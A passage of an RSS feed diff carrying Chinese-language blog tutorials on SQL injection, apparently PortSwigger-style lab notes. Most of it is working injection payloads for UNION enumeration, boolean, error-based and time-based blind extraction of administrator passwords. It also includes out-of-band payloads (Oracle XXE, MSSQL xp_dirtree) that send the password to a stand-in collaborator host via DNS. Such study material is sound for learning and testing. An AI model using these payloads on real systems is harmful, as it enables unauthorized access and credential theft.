+</span></span><span class="line"><span class="ln">3</span><span class="cl">&#39; union select @@version,null-- 
+</span></span></code></pre></div><h3 id="查询数据库内容">查询数据库内容</h3>
+<p>大多数数据库类型（除了 Oracle 之外）都有一组称为信息模式的视图。这提供了关于数据库的信息。可以查询以列出数据库中的表格：</p>
+<p><code>SELECT * FROM information_schema.tables</code></p>
+<p>此时返回的输出如下：</p>
+<table>
+	<thead>
+			<tr>
+					<th>TABLE_CATALOG</th>
+					<th>TABLE_SCHEMA</th>
+					<th>TABLE_NAME</th>
+					<th>TABLE_TYPE</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>MyDatabase</td>
+					<td>dbo</td>
+					<td>Products</td>
+					<td>BASE TABLE</td>
+			</tr>
+			<tr>
+					<td>MyDatabase</td>
+					<td>dbo</td>
+					<td>Users</td>
+					<td>BASE TABLE</td>
+			</tr>
+			<tr>
+					<td>MyDatabase</td>
+					<td>dbo</td>
+					<td>Feedback</td>
+					<td>BASE TABLE</td>
+			</tr>
+	</tbody>
+</table>
+<p>该输出表明有三个表，分别称为<code>Products</code> 、<code>Users</code> 和 <code>Feedback</code></p>
+<p>然后你可以查询列出单独表中的列：</p>
+<p><code>SELECT * FROM information_schema.columns WHERE table_name = 'Users'</code></p>
+<p>此时返回的输出如下：</p>
+<table>
+	<thead>
+			<tr>
+					<th>TABLE_CATALOG</th>
+					<th>TABLE_SCHEMA</th>
+					<th>TABLE_NAME</th>
+					<th>COLUMN_NAME</th>
+					<th>DATA_TYPE</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>MyDatabase</td>
+					<td>dbo</td>
+					<td>Users</td>
+					<td>UserId</td>
+					<td>int</td>
+			</tr>
+			<tr>
+					<td>MyDatabase</td>
+					<td>dbo</td>
+					<td>Users</td>
+					<td>Username</td>
+					<td>varchar</td>
+			</tr>
+			<tr>
+					<td>MyDatabase</td>
+					<td>dbo</td>
+					<td>Users</td>
+					<td>Password</td>
+					<td>varchar</td>
+			</tr>
+	</tbody>
+</table>
+<p>在Oracle上，你可以找到以下相同的信息：</p>
+<ul>
+<li>
+<p>可以通过查询列出表格：</p>
+<p><code>SELECT * FROM all_tables</code></p>
+</li>
+<li>
+<p>可以通过查询列出列：</p>
+<p><code>SELECT * FROM all_tab_columns WHERE table_name = 'USERS'</code></p>
+</li>
+</ul>
+<p>以非Oracle数据库为例：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">&#39; order by 2 --+  # 得到有2列
+</span></span><span class="line"><span class="ln">2</span><span class="cl">category=Pet&#39;union select table_name,null from information_schema.tables--  # 得到数据库中的表名users_abcdef
+</span></span><span class="line"><span class="ln">3</span><span class="cl">&#39;union select column_name,null from information_schema.columns where table_name=&#39;users_abcdef&#39;--  # 得到需要的列名names和keys
+</span></span><span class="line"><span class="ln">4</span><span class="cl">&#39;union select names, keys from users_abcdef--  # 得到用户名和密码
+</span></span></code></pre></div><p>当然，有时候数据库中不止有一个表，这样就不能通过1列完整显示出来。于是，采用<code>group_concat</code>函数：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">&#39; order by 3 %23  # 得到有3列
+</span></span><span class="line"><span class="ln">2</span><span class="cl">&#39;union select null,null,group_concat(table_name) from information_schema.tables where table_schema=database()%23  # 得到数据库中的表名，而且不用再查询库名
+</span></span><span class="line"><span class="ln">3</span><span class="cl">&#39;union select null,null,group_concat(column_name) from information_schema.columns where table_name=&#39;users_abcdef&#39;%23  # 得到需要的列名names和keys
+</span></span><span class="line"><span class="ln">4</span><span class="cl">&#39;union select null,null,group_concat(id) from users_abcdef%23  # 得到id
+</span></span></code></pre></div>]]></content:encoded>
+    </item>
+    <item>
+      <title>盲注</title>
+      <link>https://all-on.github.io/posts/web/sql/%E7%9B%B2%E6%B3%A8/</link>
+      <pubDate>Sun, 15 Feb 2026 00:00:00 +0000</pubDate>
+      <guid>https://all-on.github.io/posts/web/sql/%E7%9B%B2%E6%B3%A8/</guid>
+      <description>&lt;h2 id=&#34;基于条件响应的sql盲注&#34;&gt;基于条件响应的SQL盲注&lt;/h2&gt;
+&lt;p&gt;考虑一个使用跟踪Cookie收集使用数据分析的应用。对应用程序的请求包含如下的 cookie 头：&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;当处理包含 cookie 的请求时，应用程序会使用 SQL 查询来确定该用户是否为已知用户：&lt;/p&gt;</description>
+      <content:encoded><![CDATA[<h2 id="基于条件响应的sql盲注">基于条件响应的SQL盲注</h2>
+<p>考虑一个使用跟踪Cookie收集使用数据分析的应用。对应用程序的请求包含如下的 cookie 头：</p>
+<p><code>Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4</code></p>
+<p>当处理包含 cookie 的请求时，应用程序会使用 SQL 查询来确定该用户是否为已知用户：</p>
+<p><code>SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'</code></p>
+<p>该查询存在SQL注入的漏洞，但查询结果不会返回给用户。然而，应用程序的行为会根据查询是否返回数据而有所不同。如果提交已识别的<code>TrackingId</code>，查询会返回数据，回复中会显示“<code>Welcome back</code>”的消息。于是，可以这样测试是否存在注入点：<code>TrackingId=</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">xyz&#39; AND 1=1 --+  # 显示“Welcome back”
+</span></span><span class="line"><span class="ln">2</span><span class="cl">xyz&#39; AND 1=2 --+  # 不显示
+</span></span></code></pre></div><p>继续在<code>TrackingId</code>后进行注入实验：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">&#39; AND (SELECT &#39;a&#39; FROM users LIMIT 1)=&#39;a  # 若返回了&#34;Welcome back&#34;，说明存在表users
+</span></span><span class="line"><span class="ln">2</span><span class="cl">
+</span></span><span class="line"><span class="ln">3</span><span class="cl">&#39; AND (SELECT &#39;a&#39; FROM users WHERE username=&#39;administrator&#39;)=&#39;a  # 存在用户名 administrator
+</span></span><span class="line"><span class="ln">4</span><span class="cl">
+</span></span><span class="line"><span class="ln">5</span><span class="cl">&#39; AND (SELECT &#39;a&#39; FROM users WHERE username=&#39;administrator&#39; AND LENGTH(password)&gt;1)=&#39;a  # 判断密码长度大于1
+</span></span><span class="line"><span class="ln">6</span><span class="cl">
+</span></span><span class="line"><span class="ln">7</span><span class="cl">&#39; AND (SELECT SUBSTRING(password,3,1) FROM users WHERE username=&#39;administrator&#39;)=&#39;a  # 用于判断密码的第3个字符值是否为a
+</span></span></code></pre></div><p>可以在Grep-Match中进行匹配爆破</p>
+<h2 id="基于条件错误的sql盲注">基于条件错误的SQL盲注</h2>
+<p>有些应用程序执行SQL查询，但无论查询是否返回数据，行为都不会改变。通常可以根据是否出现SQL错误，诱导应用程序返回不同的响应。比如，还是上面的更改Cookie中的<code>TrackingId</code>：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln"> 1</span><span class="cl">&#39;||(SELECT &#39;&#39;)||&#39;  # 非Oracle数据库执行
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl">&#39;||(SELECT &#39;&#39; FROM dual)||&#39;  # Oracle数据库执行
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl">&#39;||(SELECT &#39;&#39; FROM not-a-real-table)||&#39;  # 如果报错，则可以确定存在注入
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">&#39;||(SELECT &#39;&#39; FROM users WHERE ROWNUM = 1)||&#39;  # 验证表users的存在
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">&#39;||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE &#39;&#39; END FROM users WHERE username=&#39;administrator&#39;)||&#39;  # 报错则administrator用户存在
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl">&#39;||(SELECT CASE WHEN LENGTH(password)&gt;2 THEN TO_CHAR(1/0) ELSE &#39;&#39; END FROM users WHERE username=&#39;administrator&#39;)||&#39;  # 检测密码长度
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">
+</span></span><span class="line"><span class="ln">10</span><span class="cl">&#39;||(SELECT CASE WHEN SUBSTR(password,1,1)=&#39;a&#39; THEN TO_CHAR(1/0) ELSE &#39;&#39; END FROM users WHERE username=&#39;administrator&#39;)||&#39;  # 测试密码第1个字符是否是a
+</span></span></code></pre></div><h2 id="基于可见错误的sql注入">基于可见错误的SQL注入</h2>
+<p>数据库配置错误有时会导致冗长错误信息。这些信息可能对攻击者有用。让应用程序生成包含部分查询返回数据的错误消息，这实际上将原本盲目的SQL注入漏洞变成了可见的漏洞。可以用<code>CAST()</code>函数来实现这个功能。它允许将一种数据类型转换为另一种。假设已知列名username和password，以及用户名administrator：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">&#39; AND 1=CAST((SELECT 1) AS int)--  # 服务器正常回显，表明这是一个有效的查询
+</span></span><span class="line"><span class="ln">2</span><span class="cl">&#39; AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--  # 查询用户名
+</span></span><span class="line"><span class="ln">3</span><span class="cl">&#39; AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--  # 查询密码
+</span></span></code></pre></div><h2 id="时延sql盲注">时延SQL盲注</h2>
+<p>如果应用程序在执行SQL查询时发现了数据库错误并优雅地处理，那么应用程序的响应就不会有任何区别。这意味着之前诱导条件错误的技术将无法起作用。在这种情况下，通常可以通过根据注入条件为真或假触发时间延迟来利用盲目SQL注入漏洞。由于SQL查询通常由应用程序同步处理，延迟SQL查询的执行也会延迟HTTP响应。这使得能够根据收到HTTP响应所需的时间来判断注入条件的真实性。
+例如：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">&#39;||pg_sleep(10)--  # 延迟10秒
+</span></span></code></pre></div><h2 id="带有时间延迟和信息检索的sql盲注">带有时间延迟和信息检索的SQL盲注</h2>
+<p>触发时间延迟的技术因所用数据库类型而异。例如，在 Microsoft SQL Server 上，您可以使用以下方法测试条件并根据表达式是否为真触发延迟：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">&#39;; IF (1=2) WAITFOR DELAY &#39;0:0:10&#39;--  # 第一个输入不会触发延迟，因为该条件为假
+</span></span><span class="line"><span class="ln">2</span><span class="cl">&#39;; IF (1=1) WAITFOR DELAY &#39;0:0:10&#39;--  # 第二次输入触发10秒的延迟，因为该条件为真
+</span></span></code></pre></div><p>假如数据库版本是PostgreSQL（只能靠猜了），则在BurpSuite中可以这样做（对分号编码为<code>%3B</code>以实现堆叠查询，从而独立执行一条新的 <code>SELECT</code> 语句）：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">&#39;%3BSELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END-- 
+</span></span><span class="line"><span class="ln">2</span><span class="cl">&#39;%3BSELECT CASE WHEN (username=&#39;administrator&#39;) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--  # 延时说明存在administrator用户
+</span></span><span class="line"><span class="ln">3</span><span class="cl">&#39;%3BSELECT CASE WHEN (username=&#39;administrator&#39; AND LENGTH(password)&gt;1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--  # 判断密码长度
+</span></span><span class="line"><span class="ln">4</span><span class="cl">&#39;%3BSELECT CASE WHEN (username=&#39;administrator&#39; AND SUBSTRING(password,1,1)=&#39;a&#39;) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--  # 判断密码第1个字符是a
+</span></span></code></pre></div><p>将BurpSuite的资源池改为最大为1线程，添加响应列查看响应时间进行判断</p>
+<h2 id="带外交互的sql盲注">带外交互的SQL盲注</h2>
+<p>应用程序可能会执行与前述相同的SQL查询，但采用异步方式。应用程序继续在原始线程中处理用户请求，并使用另一线程使用追踪 Cookie 执行 SQL 查询。查询仍易受SQL注入影响，但目前描述的技术都无法使用。应用程序的响应不依赖于查询返回任何数据、数据库错误发生，或查询执行所需时间。</p>
+<p>在这种情况下，通常可以通过触发对控制系统的带外**(Out-of-Band)** 网络交互来利用盲目SQL注入漏洞。这些可以根据注入条件触发，逐条推断信息。更有用的是，数据可以直接在网络交互中被窃取。</p>
+<p>可以使用多种网络协议来实现这一目的，但通常最有效的是DNS（域名服务）。许多生产网络允许DNS查询自由出口，因为它们对生产系统的正常运行至关重要。例如，Microsoft SQL Server上的以下输入可用于对指定域名进行DNS查询：</p>
+<p><code>'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--</code></p>
+<p>这会导致数据库对以下域进行查找：</p>
+<p><code>0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net</code></p>
+<p>再比如，在Oracle中进行：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">&#39; UNION SELECT EXTRACTVALUE(xmltype(&#39;&lt;%3fxml version%3d&#34;1.0&#34; encoding%3d&#34;UTF-8&#34;%3f&gt;&lt;!DOCTYPE root [ &lt;!ENTITY %25 remote SYSTEM &#34;http%3a//BURP-COLLABORATOR-SUBDOMAIN/&#34;&gt; %25remote%3b]&gt;&#39;),&#39;/l&#39;) FROM dual--
+</span></span></code></pre></div><p>上面这段翻译过来就是：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">&#39; UNION SELECT EXTRACTVALUE(xmltype(&#39;&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM &#34;http://BURP-COLLABORATOR-SUBDOMAIN/&#34;&gt; %remote; ]&gt;&#39;),&#39;/l&#39;) FROM dual--
+</span></span></code></pre></div><p><strong>各部分函数</strong>：</p>
+<ul>
+<li><strong><code>' UNION SELECT ... FROM dual--</code></strong><br>
+用 <code>UNION</code> 将当前查询与一个自定义的 <code>SELECT</code> 合并，<code>dual</code> 是 Oracle 的虚拟表，确保语法正确。</li>
+<li><strong><code>EXTRACTVALUE(xmltype(...), '/l')</code></strong><br>
+Oracle 函数：<code>xmltype</code> 将字符串解析为 XML，<code>EXTRACTVALUE</code> 提取 XPath 路径 <code>/l</code> 的值。这里 <code>/l</code> 并不存在，目的是触发 XML 解析过程，而不是真正提取数据。</li>
+<li><strong>XML 内容</strong>
+<ul>
+<li>定义了一个外部实体 <code>%remote</code>，其 <code>SYSTEM</code> 标识符指向一个动态构造的 URL。</li>
+<li>实体引用 <code>%remote;</code> 会触发解析器尝试获取该外部资源，导致向构造的域名发起 HTTP 或 DNS 请求。</li>
+</ul>
+</li>
+</ul>
+<p>当数据库执行此 XML 解析时，它会将密码拼接进域名，并向攻击者控制的服务器 <code>BURP-COLLABORATOR-SUBDOMAIN</code> 发起 DNS 查询（若 HTTP 不可达，通常回退到 DNS 解析）。攻击者通过监听该域名的 DNS 请求日志，即可获取密码明文。</p>
+<p>现在需要在BurpSuite中开启collaborator，复制服务器地址替换<code>BURP-COLLABORATOR-SUBDOMAIN</code>。<code>send</code>之后<code>pull now</code>拉取数据</p>
+<h2 id="带外交互获取数据实现sql盲注">带外交互获取数据实现SQL盲注</h2>
+<p>可以将SQL注入与基本的XXE技术结合，例如：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">&#39; UNION SELECT EXTRACTVALUE(xmltype(&#39;&lt;%3fxml version%3d&#34;1.0&#34; encoding%3d&#34;UTF-8&#34;%3f&gt;&lt;!DOCTYPE root [ &lt;!ENTITY %25 remote SYSTEM &#34;http%3a//&#39;||(SELECT password FROM users WHERE username%3d&#39;administrator&#39;)||&#39;.BURP-COLLABORATOR-SUBDOMAIN/&#34;&gt; %25remote%3b]&gt;&#39;),&#39;/l&#39;) FROM dual--
+</span></span></code></pre></div><p>在显示的DNS结果中显示密码</p>
+]]></content:encoded>
+    </item>
+  </channel>
+</rss>
